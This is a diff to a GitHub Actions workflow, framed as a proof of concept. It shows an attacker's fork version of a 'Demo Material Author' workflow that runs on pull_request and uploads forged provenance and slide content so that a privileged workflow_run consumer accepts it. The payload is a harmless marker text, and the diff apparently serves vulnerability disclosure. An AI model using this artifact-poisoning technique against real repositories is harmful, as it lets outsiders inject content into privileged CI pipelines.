@@ -1,10 +1,15 @@
-# PoC replica of microsoft/hve-core "Demo Material Author" (legitimate version).
-# The real workflow only runs on schedule/workflow_dispatch; the attacker's fork
-# version of this same file is what runs on the pull_request event.
+# Attacker's fork version of the very same workflow name/path:
+#   name:  Demo Material Author
+#   path:  .github/workflows/demo-material-author.yml
+# The base repository version only runs on workflow_dispatch; this fork version
+# runs on pull_request, so a fork PR produces a successful run of the workflow
+# the privileged "Demo Material Render" workflow_run consumer watches for.
 name: Demo Material Author
 
 on:
-  workflow_dispatch:
+  pull_request:
+    branches:
+      - main
 
 permissions:
   contents: read
@@ -13,5 +18,43 @@ jobs:
   author:
     runs-on: ubuntu-latest
     steps:
-      - name: Legitimate authoring
-        run: echo "legit author run (not attacker controlled in the base repo)"
+      - name: Forge a demo-material-content artifact as the "author" run
+        run: |
+          set -euo pipefail
+          dest="${RUNNER_TEMP}/content"
+          mkdir -p "${dest}/L100/content/slide-001" "${dest}/L100/content/global" "${dest}/L100/research"
+
+          python3 - <<PY
+          import json, os
+          provenance = {
+              "schema_version": "demo-material-content/v1",
+              "author_run_id": os.environ["GITHUB_RUN_ID"],
+              "source_sha": os.environ["GITHUB_SHA"],
+              "levels": ["L100"],
+          }
+          with open("${dest}/provenance.json", "w", encoding="utf-8") as handle:
+              json.dump(provenance, handle)
+          PY
+
+          cat > "${dest}/L100/content/slide-001/content.yaml" <<'YAML'
+          title: "ATTACKER CONTROLLED CONTENT rendered by the privileged run"
+          elements:
+            - type: text
+              text: "This slide was authored by an external fork-PR attacker and accepted by Demo Material Render."
+          YAML
+
+          cat > "${dest}/L100/content/global/style.yaml" <<'YAML'
+          title: "Attacker deck"
+          subject: "attacker controlled"
+          YAML
+
+          printf -- '- path: README.md\n' > "${dest}/L100/manifest.yml"
+          printf '# attacker source register\n' > "${dest}/L100/research/source-register.md"
+          printf 'captures: []\n' > "${dest}/L100/capture-plan.yml"
+          find "${dest}" -type f
+
+      - name: Upload the forged author content artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: demo-material-content-${{ github.run_id }}
+          path: ${{ runner.temp }}/content
